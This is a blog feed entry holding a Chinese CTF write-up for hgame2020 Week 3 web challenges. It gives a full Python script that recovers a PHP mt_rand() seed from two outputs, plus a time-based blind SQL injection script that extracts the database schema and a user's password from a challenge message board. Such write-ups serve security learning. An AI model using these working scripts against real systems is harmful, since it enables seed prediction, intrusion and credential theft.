    <content type="html"><![CDATA[<p>hgame2020-Level-Week3_Web_writeup</p><a id="more"></a><h2 id="二发入魂！"><a href="#二发入魂！" class="headerlink" title="二发入魂！"></a>二发入魂！</h2><p>这里具体可以看这篇文章，<a href="https://www.ambionics.io/blog/php-mt-rand-prediction" target="_blank" rel="noopener">BREAKING PHP’S MT_RAND() WITH 2 VALUES AND NO BRUTEFORCE</a>，原理很不错，值得研究。</p><p>把下面两个文件放在同一目录下</p><p><code>reverse_mt_rand.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3.6</span></span><br><span class="line"><span class="comment"># Charles Fol</span></span><br><span class="line"><span class="comment"># @cfreal_</span></span><br><span class="line"><span class="comment"># 2020-01-04 (originally la long time ago ~ 2010)</span></span><br><span class="line"><span class="comment"># Breaking mt_rand() with two output values and no bruteforce.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">R = final rand value</span></span><br><span class="line"><span class="string">S = merged state value</span></span><br><span class="line"><span class="string">s = original state value</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">N = <span class="number">624</span></span><br><span class="line">M = <span class="number">397</span></span><br><span class="line"></span><br><span class="line">MAX = <span class="number">0xffffffff</span></span><br><span class="line">MOD = MAX + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># STATE_MULT * STATE_MULT_INV = 1 (mod MOD)</span></span><br><span class="line">STATE_MULT = <span class="number">1812433253</span></span><br><span class="line">STATE_MULT_INV = <span class="number">2520285293</span></span><br><span class="line"></span><br><span class="line">MT_RAND_MT19937 = <span class="number">1</span></span><br><span class="line">MT_RAND_PHP = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_initialize</span><span class="params">(seed)</span>:</span></span><br><span class="line">    <span class="string">"""Creates the initial state array from a seed.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    state = [<span class="keyword">None</span>] * N</span><br><span class="line">    state[<span class="number">0</span>] = seed &amp; <span class="number">0xffffffff</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, N):</span><br><span class="line">        r = state[i - <span class="number">1</span>]</span><br><span class="line">        state[i] = (STATE_MULT * (r ^ (r &gt;&gt; <span class="number">30</span>)) + i) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_initialize</span><span class="params">(s, p)</span>:</span></span><br><span class="line">    <span class="string">"""From an initial state value `s` at position `p`, find out seed.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># We have:</span></span><br><span class="line">    <span class="comment"># state[i] = (1812433253U * ( state[i-1] ^ (state[i-1] &gt;&gt; 30) + i )) % 100000000</span></span><br><span class="line">    <span class="comment"># and:</span></span><br><span class="line">    <span class="comment"># (2520285293 * 1812433253) % 100000000 = 1 (Modular mult. inverse)</span></span><br><span class="line">    <span class="comment"># =&gt; 2520285293 * (state[i] - i) = ( state[i-1] ^ (state[i-1] &gt;&gt; 30) ) (mod 100000000)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(p, <span class="number">0</span>, <span class="number">-1</span>):</span><br><span class="line">        s = _undo_php_mt_initialize(s, i)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_undo_php_mt_initialize</span><span class="params">(s, i)</span>:</span></span><br><span class="line">    s = (STATE_MULT_INV * (s - i)) &amp; MAX</span><br><span class="line">    <span class="keyword">return</span> s ^ s &gt;&gt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_rand</span><span class="params">(s1)</span>:</span></span><br><span class="line">    <span class="string">"""Converts a merged state value `s1` into a random value, then sent to the</span></span><br><span class="line"><span class="string">    user.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9d2c5680</span></span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_rand</span><span class="params">(s1)</span>:</span></span><br><span class="line">    <span class="string">"""Retrieves the merged state value from the value sent to the user.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    s1 ^= (s1 &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    s1 ^= (s1 &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xefc60000</span></span><br><span class="line"></span><br><span class="line">    s1 = undo_lshift_xor_mask(s1, <span class="number">7</span>, <span class="number">0x9d2c5680</span>)</span><br><span class="line"></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">11</span></span><br><span class="line">    s1 ^= s1 &gt;&gt; <span class="number">22</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_lshift_xor_mask</span><span class="params">(v, shift, mask)</span>:</span></span><br><span class="line">    <span class="string">"""r s.t. v = r ^ ((r &lt;&lt; shift) &amp; mask)</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(shift, <span class="number">32</span>, shift):</span><br><span class="line">        v ^= (bits(v, i - shift, shift) &amp; bits(mask, i, shift)) &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bits</span><span class="params">(v, start, size)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> lobits(v &gt;&gt; start, size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lobits</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; ((<span class="number">1</span> &lt;&lt; b) - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bit</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> v &amp; (<span class="number">1</span> &lt;&lt; b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bv</span><span class="params">(v, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> bit(v, b) &gt;&gt; b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">php_mt_reload</span><span class="params">(state, flavour)</span>:</span></span><br><span class="line">    s = state</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, N - M):</span><br><span class="line">        s[i] = _twist_php(s[i + M], s[i], s[i + <span class="number">1</span>], flavour)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(N - M, N - <span class="number">1</span>):</span><br><span class="line">        s[i] = _twist_php(s[i + M - N], s[i], s[i + <span class="number">1</span>], flavour)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_twist_php</span><span class="params">(m, u, v, flavour)</span>:</span></span><br><span class="line">    <span class="string">"""Emulates the `twist` and `twist_php` #defines.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span> <span class="keyword">if</span> (u <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">else</span> v) &amp; <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> m ^ (((u &amp; <span class="number">0x80000000</span>) | (v &amp; <span class="number">0x7FFFFFFF</span>)) &gt;&gt; <span class="number">1</span>) ^ mask</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">undo_php_mt_reload</span><span class="params">(S000, S227, offset, flavour)</span>:</span></span><br><span class="line">    <span class="comment"># define twist_php(m,u,v)  (m ^ (mixBits(u,v)&gt;&gt;1) ^ ((uint32_t)(-(int32_t)(loBit(u))) &amp; 0x9908b0dfU))</span></span><br><span class="line">    <span class="comment"># m S000</span></span><br><span class="line">    <span class="comment"># u S227</span></span><br><span class="line">    <span class="comment"># v S228</span></span><br><span class="line">    X = S000 ^ S227</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This means the mask was applied, and as such that S227's LSB is 1</span></span><br><span class="line">    s22X_0 = bv(X, <span class="number">31</span>)</span><br><span class="line">    <span class="comment"># remove mask if present</span></span><br><span class="line">    <span class="keyword">if</span> s22X_0:</span><br><span class="line">        X ^= <span class="number">0x9908b0df</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Another easy guess</span></span><br><span class="line">    s227_31 = bv(X, <span class="number">30</span>)</span><br><span class="line">    <span class="comment"># remove bit if present</span></span><br><span class="line">    <span class="keyword">if</span> s227_31:</span><br><span class="line">        X ^= <span class="number">1</span> &lt;&lt; <span class="number">30</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># We're missing bit 0 and bit 31 here, so we have to try every possibility</span></span><br><span class="line">    s228_1_30 = (X &lt;&lt; <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> s228_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> s228_31 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_MT19937 <span class="keyword">and</span> s22X_0 != s228_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            s228 = s228_0 | s228_31 &lt;&lt; <span class="number">31</span> | s228_1_30</span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the results are consistent with the known bits of s227</span></span><br><span class="line">            s227 = _undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            <span class="keyword">if</span> flavour == MT_RAND_PHP <span class="keyword">and</span> bv(s227, <span class="number">0</span>) != s22X_0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> bv(s227, <span class="number">31</span>) != s227_31:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># Check if the guessed seed yields S000 as its first scrambled state</span></span><br><span class="line">            rand = undo_php_mt_initialize(s228, <span class="number">228</span> + offset)</span><br><span class="line">            state = php_mt_initialize(rand)</span><br><span class="line">            php_mt_reload(state, flavour)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (S000 == state[offset]):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> rand</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(_R000, _R227, offset, flavour)</span>:</span></span><br><span class="line">    <span class="comment"># Both were &gt;&gt; 1, so the leftmost byte is unknown</span></span><br><span class="line">    _R000 &lt;&lt;= <span class="number">1</span></span><br><span class="line">    _R227 &lt;&lt;= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> R000_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> R227_0 <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            R000 = _R000 | R000_0</span><br><span class="line">            R227 = _R227 | R227_0</span><br><span class="line">            S000 = undo_php_mt_rand(R000)</span><br><span class="line">            S227 = undo_php_mt_rand(R227)</span><br><span class="line">            seed = undo_php_mt_reload(S000, S227, offset, flavour)</span><br><span class="line">            <span class="keyword">if</span> seed:</span><br><span class="line">                <span class="keyword">return</span> seed</span><br></pre></td></tr></table></figure><p><code>exp.py</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">from reverse_mt_rand import main</span><br><span class="line">url = &apos;https://twoshot.hgame.n3ko.co&apos;</span><br><span class="line">r = requests.Session()</span><br><span class="line">random_num = r.get(url + &apos;/random.php?times=229&apos;).text</span><br><span class="line">random_num = eval(random_num)</span><br><span class="line">first_arg = random_num[0]</span><br><span class="line">second_arg = random_num[227]</span><br><span class="line">third_arg = 0</span><br><span class="line">end_arg = 0</span><br><span class="line">result = main(first_arg,second_arg,third_arg,end_arg)</span><br><span class="line">print(r.post(url=url+&quot;/verify.php&quot;,data=&#123;&quot;ans&quot;: str(result)&#125;).text)</span><br></pre></td></tr></table></figure><p>运行<code>exp.py</code>即可得到flag</p><h2 id="Cosmos的留言板-2"><a href="#Cosmos的留言板-2" class="headerlink" title="Cosmos的留言板-2"></a>Cosmos的留言板-2</h2><p>这里是比较简单的延时盲注，几乎没有任何过滤，用二分法即可跑出来，脚本如下</p><p><code>exp.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">url = <span class="string">'http://139.199.182.61:19999/index.php?method=delete&amp;delete_id='</span></span><br><span class="line">headers = &#123;<span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=q80egc37cuo61j1ftstcc25ej9'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_message</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">'http://139.199.182.61:19999/index.php?method=send'</span></span><br><span class="line">    html = requests.post(url=url, data=&#123;<span class="string">'message'</span>: <span class="string">'1'</span>&#125;, headers=headers).text</span><br><span class="line">    <span class="keyword">return</span> max(re.findall(<span class="string">r"&lt;a href=.+method=delete&amp;delete_id=(.+)'&gt;"</span>,html))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search_sql</span><span class="params">(start,end,payload,length=<span class="number">2</span>)</span>:</span></span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length+<span class="number">1</span>):</span><br><span class="line">        left = start</span><br><span class="line">        right = end</span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            mid = (left + right) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> mid == left:</span><br><span class="line">                name += chr(mid)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            full_payload = payload.format(id=create_message(),num1=str(i),num2=str(mid))</span><br><span class="line">            requests.get(url=url+full_payload,headers=headers)</span><br><span class="line">            print(full_payload)</span><br><span class="line">            <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">2.5</span>:</span><br><span class="line">                right = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                left = mid</span><br><span class="line">    <span class="keyword">return</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破库名长度</span></span><br><span class="line"><span class="comment"># 7</span></span><br><span class="line">database_length_payload = <span class="string">"&#123;id&#125; and if(ascii(mid(length(database()),&#123;num1&#125;,1))&lt;&#123;num2&#125;,sleep(3),1)"</span></span><br><span class="line">database_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,database_length_payload,<span class="number">1</span>)</span><br><span class="line">print(<span class="string">'database_length:'</span>+database_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破库名</span></span><br><span class="line"><span class="comment"># babysql</span></span><br><span class="line">database_payload = <span class="string">"&#123;id&#125; and if(ascii(mid((database()),&#123;num1&#125;,1))&lt;&#123;num2&#125;,sleep(3),1)"</span></span><br><span class="line">print(<span class="string">'database_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,database_payload,<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破表名长度</span></span><br><span class="line"><span class="comment"># 13</span></span><br><span class="line">table_length_payload = <span class="string">"&#123;id&#125; and if((ascii(mid((length((select group_concat(table_name) from information_schema.tables where table_schema=database()))),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)"</span></span><br><span class="line">table_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,table_length_payload)</span><br><span class="line">print(<span class="string">'table_length:'</span>+table_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破表名</span></span><br><span class="line"><span class="comment"># messages,user</span></span><br><span class="line">table_name_payload = <span class="string">"&#123;id&#125; and if((ascii(mid(((select group_concat(table_name) from information_schema.tables where table_schema=database())),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)"</span></span><br><span class="line">print(<span class="string">'table_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,table_name_payload,int(table_length)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破messages表下的字段长度</span></span><br><span class="line"><span class="comment"># 26</span></span><br><span class="line">column_length_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(length((select group_concat(column_name) from information_schema.columns where table_name=0x6D65737361676573)),&#123;num1&#125;,1)) &lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">column_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,column_length_payload)</span><br><span class="line">print(<span class="string">'column_length:'</span>+column_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破messages表下的字段</span></span><br><span class="line"><span class="comment"># message_id,user_id,message</span></span><br><span class="line">column_name_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(((select group_concat(column_name) from information_schema.columns where table_name=0x6D65737361676573)),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">print(<span class="string">'column_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,column_name_payload,int(column_length)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破user表下的字段长度</span></span><br><span class="line"><span class="comment"># 16</span></span><br><span class="line">column2_length_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(length((select group_concat(column_name) from information_schema.columns where table_name=0x75736572)),&#123;num1&#125;,1)) &lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">column2_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,column2_length_payload)</span><br><span class="line">print(<span class="string">'column_length:'</span>+column2_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破user表下的字段</span></span><br><span class="line"><span class="comment"># id,name,password</span></span><br><span class="line">column2_name_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(((select group_concat(column_name) from information_schema.columns where table_name=0x75736572)),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">print(<span class="string">'column_name:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,column2_name_payload,int(column2_length)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破user表下的数据长度</span></span><br><span class="line"><span class="comment"># 28</span></span><br><span class="line">data_user_length_payload = <span class="string">'&#123;id&#125; and if((ascii(mid(length((select password from babysql.user where name=\'cosmos\')),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">data_user_length = binary_search_sql(<span class="number">48</span>,<span class="number">57</span>,data_user_length_payload)</span><br><span class="line">print(<span class="string">'data_user_length:'</span>+data_user_length)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里爆破user表下的数据</span></span><br><span class="line">data_user_payload = <span class="string">'&#123;id&#125; and if((ascii(mid((select password from babysql.user where name=\'cosmos\'),&#123;num1&#125;,1))&lt;&#123;num2&#125;),sleep(3),1)'</span></span><br><span class="line">print(<span class="string">'data_user:'</span>+binary_search_sql(<span class="number">33</span>,<span class="number">127</span>,data_user_payload,int(data_user_length)))</span><br></pre></td></tr></table></figure><p>然后得到<code>cosmos</code>的密码，登录即可得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;hgame2020-Level-Week3_Web_writeup&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
</feed>
